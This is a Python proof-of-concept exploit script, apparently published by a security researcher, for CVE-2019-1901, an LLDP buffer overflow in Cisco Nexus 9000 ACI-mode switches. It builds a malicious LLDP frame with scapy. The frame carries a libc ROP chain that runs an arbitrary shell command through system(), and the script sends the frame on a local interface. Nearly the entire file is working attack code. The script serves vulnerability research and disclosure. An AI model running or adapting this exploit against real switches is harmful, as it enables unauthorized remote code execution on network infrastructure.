#!/usr/bin/python3

from scapy.all import *
from scapy.utils import *
import codecs
import struct
import argparse

parser = argparse.ArgumentParser(description="Proof of concept for remote code execution on CVE-2019-1901 (Cisco Nexus 9000 Series Fabric Switches Application Centric Infrastructure Mode Link Layer Discovery Protocol Buffer Overflow Vulnerability). Affected versions: 14.1(1j) - by Frank Block (ERNW Research GmbH) \n\n", formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-l', '--libc_base', dest='libc_offset', default=0xedb72000, type=int, help='specify a non-default libc base address; can be used for reproduction purposes')
parser.add_argument('-m', '--mac_address', dest='mac_address', default="70ea1aa0b336", type=str, help='mac address to use in the lldp packet; only necessary when exploiting a daemon already getting lldp packets from the current system (e.g. when exploiting a spine from a leaf)')
parser.add_argument('-f', '--interface', dest='interface', default='enp0s25', type=str, help='the network interface')
parser.add_argument('-c', '--command', dest='command', required=True, type=str, help='the command to execute')
parser.add_argument('-v', '--verbose', dest='verbose', default=False, action='store_true', help='Activate verbose')

args = parser.parse_args()

mac_lldp_multicast = '01:80:c2:00:00:0e'

# Those lines just create the first part of the LLDP packet
intf_id = codecs.encode(str(ord(codecs.decode(codecs.encode(args.mac_address[-2:], 'ascii'), "hex"))), 'ascii')
frame_bytes_first = codecs.decode("020704" + args.mac_address + "040807457468312f", "hex") + intf_id + codecs.decode("06020078", "hex")
eth = Ether(dst=mac_lldp_multicast, type=0x88cc)

# To reproduce more reliably, supply the base address of libc with the -l cmd line argument
# fgrep libc- /proc/$PID/maps
libc_offset = args.libc_offset

# The offset to the system function within libc
libc_system_offset = 0x3f230


#### The following two rop gadgets are used:

# 0x000fd34d : add esp, 0x7c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
#   The stored EIP is overwritten with this gadget's address.
#   This gadget moves the stack pointer to data we control (the ropchain below)
#   and loads the system function address in ebx
libc_gadget_offset = 0x000fd34d

# 0x0018274c : push esp ; mov al, 0xef ; call ebx
#   At the time of the execution of this rop gadget, ESP points to the
#   "command" cmd line argument, stored on the stack. So the push esp
#   places a pointer to this string on the stack and afterwards, system
#   is called (call ebx), treating this pointer as its argument.
libc_gadget2_offset = 0x0018274c

ropchain =  b'\x90' * 0x14
# After the add esp, 0x7c of the first gadget, esp points here
ropchain += struct.pack("<I", libc_offset + libc_system_offset)  # ebx = system
ropchain += b'\x90' * 4 # esi
ropchain += b'\x90' * 4 # edi
ropchain += b'\x90' * 4 # ebp
ropchain += struct.pack("<I", libc_offset + libc_gadget2_offset) # ret
ropchain += codecs.encode(args.command, 'utf-8') + b'\x00'

eip = struct.pack("<I", libc_offset + libc_gadget_offset)

frame_bytes_second = b'\x41' * 12 + eip


ropchain_tlv_len = len(ropchain ) + 6
ropchain_tlv = bytearray(ropchain_tlv_len)
ropchain_tlv[0:2] = (0xfe,len(ropchain) + 4) # TLV Type: Organization Specific (127); TLV Length: 15
ropchain_tlv[2:5] = (0x00,0x01,0x42) # Organization Unique Code: 00:01:42 (Cisco Systems, Inc)
ropchain_tlv[5] = (0xd4) # Subtype: Serial Number; this subtype is just used to store the ropchain
ropchain_tlv[6:] = ropchain

crash = bytearray(8)
crash[0:2] = (0xfe, 6 + len(frame_bytes_second)) # the length value triggers buffer overflow in memcpy
crash[2:5] = (0x00,0x01,0x42) # Organization Unique Code: 00:01:42 (Cisco Systems, Inc)
crash[5] = (0xd8) # Vulnerable Subtype: 0xd8
crash[6:8] = (0x00,0x00) # unknown value

payload = frame_bytes_first + ropchain_tlv + crash + frame_bytes_second + b'\x00\x00'

frame = eth / Raw(load=payload)
if args.verbose:
    print("[~] The hex encoded ethernet frame:")
    print(codecs.encode(payload, "hex"))
    print()
    print("[~] Scapy's representation of the whole frame:")
    frame.show()

print("[.] Starting to send the LLDP packet.")
sendp(frame, iface=args.interface)
print("[~] The malicious LLDP packet has been sent on interface " + args.interface)
